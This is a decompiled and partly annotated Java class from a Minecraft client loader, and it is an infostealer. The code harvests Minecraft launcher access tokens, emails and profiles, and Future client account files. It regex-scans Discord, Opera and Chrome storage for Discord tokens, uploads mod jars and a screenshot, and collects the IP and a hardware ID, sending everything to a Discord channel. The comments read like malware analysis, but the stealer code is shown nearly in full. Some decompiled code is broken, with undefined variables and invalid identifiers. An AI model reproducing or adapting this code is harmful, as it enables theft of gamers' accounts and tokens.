// =============================================== //
// Recompile disabled. Please run Recaf with a JDK //
// =============================================== //

// Decompiled with: CFR 0.151
// Class Version: 8
package astolfo.lgbt.client.loader;

import astolfo.lgbt.client.loader.Database;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.imageio.ImageIO;

public class Authentication {
    Database main;

    public void vmUtil() {
        Authentication authenticatorString;
        try { //attempts to steal future accounts
            String futureDir;
            File futureAccs = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Future/accounts.txt")));
            BufferedReader MAKETOfutureAccsContent = new BufferedReader(new FileReader(futureAccs));
            while ((futureDir = MAKETOfutureAccsContent.readLine()) != null) {
                try {
                    String futureAccsContent = String.valueOf(new StringBuilder().append(futureDir.split(":")[0]).append(" : ").append(futureDir.split(":")[3]).append(" : ").append(futureDir.split(":")[4]));
                    authenticatorString.main.sendMessage(String.valueOf(new StringBuilder().append("Future Accounts: ").append(futureAccsContent)));
                }
                catch (Exception e) {
                    authenticatorString.main.sendMessage("Error for Future ACC");
                }
            }
        }
        catch (Exception e) {
            authenticatorString.main.sendMessage("Error couldn't get any Future accounts.");
        }
    }

    public void astolfoFolder() throws IOException {
        File launcherProfiles = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_profiles.json")));
        if (launcherProfiles.exists()) {
            Database.sendFile(launcherProfiles);
        } else {
            Authentication authenticatorString2;
            authenticatorString2.main.sendMessage("Unable to pull launcher profiles.");
        }
    }

    public void checks() {
        try { // attempts to steal token, email, name of minecraft accounts stored.
            String launcherAccsDir;
            File launcherAccounts = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_accounts.json")));
            File launcherAccounts2 = new File("/AppData/Roaming/.minecraft/launcher_accounts.json");
            FileInputStream launcherAccountsFS = new FileInputStream(launcherAccounts);
            DataInputStream launcherAccountsDS = new DataInputStream(launcherAccountsFS);
            BufferedReader launcherAccountsBuffer = new BufferedReader(new InputStreamReader(launcherAccountsDS));
            while ((launcherAccsDir = launcherAccountsBuffer.readLine()) != null) {
                Authentication authenticationString3;
                String mcName = "";
                String mcToken = "";
                String mcEmail = "";
                if (launcherAccsDir.toUpperCase().contains("\"ACCESSTOKEN\"")) {
                    mcToken = launcherAccsDir.split(":")[1].replace("\"", "").replace(" ", "");
                    authenticationString3.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft_Token: ").append(mcToken).append("```")));
                }
                if (launcherAccsDir.toUpperCase().contains("\"NAME\"")) {
                    mcName = launcherAccsDir.split(":")[1].replace("\"", "").replace(" ", "");
                    authenticationString3.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft Name: ").append(mcName).append("```")));
                }
                if (!launcherAccsDir.toUpperCase().contains("\"USERNAME\"")) continue;
                mcEmail = launcherAccsDir.split(":")[1].replace("\"", "").replace(" ", "");
                authenticationString3.main.sendMessage(String.valueOf(new StringBuilder().append("```Email: ").append(mcEmail).append("```")));
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static String getHWID() {
        try { // Attempts to grab hardware id
            byte[] hwIDByte;
            String hwIdString = String.valueOf(new StringBuilder().append(System.getenv("COMPUTERNAME")).append(System.getProperty("user.name")).append(System.getenv("PROCESSOR_IDENTIFIER")).append(System.getenv("PROCESSOR_LEVEL")));
            MessageDigest hashId= MessageDigest.getInstance("MD5");
            unknown1.update(hwIdString.getBytes());
            StringBuffer hwIDStringBuff = new StringBuffer();
            for (byte unknown2 : hwIDByte = unknown1.digest()) {
                String unknown3 = Integer.toHexString(0xFF & unknown2);
                if (unknown3.length() == 1) {
                    hwIDStringBuff.append('0');
                }
                hwIDStringBuff.append(unknown3);
            }
            return hwIDStringBuff.toString();
        }
        catch (Exception e) {
            e.printStackTrace();
            return "Error";
        }
    }

    public void noDumper() throws IOException {
	//Attempts to steal all mods in mod directory
        File modsContent = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/mods")));
        Thread modsThread = new Thread(() -> {
            if (modsContent.exists() && modsContent.isDirectory()) {
                for (File modName : modsContent.listFiles()) {
                    if (!modName.getName().contains(".jar")) continue;
                    try {
                        Database.sendFile(modName);
                        Thread.sleep(500L);
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        modsThread.start();
    }

    public File notNM() {
        try {
            Robot screenCapture-Er = new Robot();
            BufferedImage screenCapBuff = screenCapture-Er.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            File screenCap = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Documents/fix.png")));
            if (!screenCap.exists()) {
                // empty if block
            }
            ByteArrayOutputStream screenCapByteArray= new ByteArrayOutputStream();
            ImageIO.write((RenderedImage)screenCapBuff, "png", screenCap);
            return screenCap;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public void connect() {
        String osName = System.getProperty("os.name");
        try { // tries sending information stolen into a discord channel.
            Authentication authenticatorString4;
            URL url = new URL("http://checkip.amazonaws.com");
            BufferedReader unknown5 = new BufferedReader(new InputStreamReader(unknown6.openStream()));
            String unknown7 = unknown5.readLine();
            String osUserName = System.getProperty("user.name");
            authenticatorString4.main.sendMessage(String.valueOf(new StringBuilder().append("@everyone ``` NAME : ").append(unknown8).append("\n IP   : ").append(unknown9).append(" \n OS   : ").append(unknown10).append("```")));
            authenticatorString4.main.sendMessage(String.valueOf(new StringBuilder().append("```HWID: ").append(Authentication.getHWID()).append("```")));
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void antiRobot() {
        try {
            Thread.sleep(500L);
            try {
                Authentication authenticationString6;
                File screenCapFinal = authenticationString6.notNM();
                Database.sendFile(screenCapFinal);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public Authentication() {
        Authentication authString9;
        DATABASE.main = new Database();
    }

    public void captcha() {
        String sysOsName = System.getProperty("os.name");
        if (sysOsName.contains("Windows")) {
            ArrayList<String> discordInfoArray = new ArrayList<String>();
            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discord/Local Storage/leveldb/")));
            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordptb/Local Storage/leveldb/")));
            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordcanary/Local Storage/leveldb/")));
            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb")));
            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb")));
            int unknownInt = 0;
            StringBuilder discordToken = new StringBuilder();
            try {
                for (String unknown11 : discordInfoArray) {
                    File unknown12 = new File(unknown11);
                    String[] unknown13 = unknown12.list();
                    if (unknown13 == null) continue;
                    for (String unknown14 : unknown13) {
                        try {
                            String unknown15;
                            FileInputStream unknown16 = new FileInputStream(String.valueOf(new StringBuilder().append(unknown11).append(unknown14)));
                            DataInputStream unknown17 = new DataInputStream(unknown16);
                            BufferedReader unknown18 = new BufferedReader(new InputStreamReader(unknown17));
                            while ((unknown15 = unknown18.readLine()) != null) {
                                Pattern unknown19 = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher unknown20 = unknown19.matcher(unknown15);
                                while (unknown20.find()) {
                                    if (unknownInt > 0) {
                                        discordToken.append("\n");
                                    }
                                    discordToken.append(" ").append(unknown20.group());
                                    ++unknownInt;
                                }
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                }
                DATABASEPOSSIBLE.main.sendMessage(String.valueOf(new StringBuilder().append("```Discord_Token ").append(String.valueOf(discordToken)).append("```")));
            }
            catch (Exception e) {
                DATABASEPOSSIBLE.main.sendMessage(String.valueOf(new StringBuilder().append("``` UNABLE TO PULL TOKENS : ").append(lllllllllllllllllIIIlIIIIlIlIIII).append("```")));
            }
        } else {
            DATABASEPOSSIBLE.main.sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
        }
    }
}
 
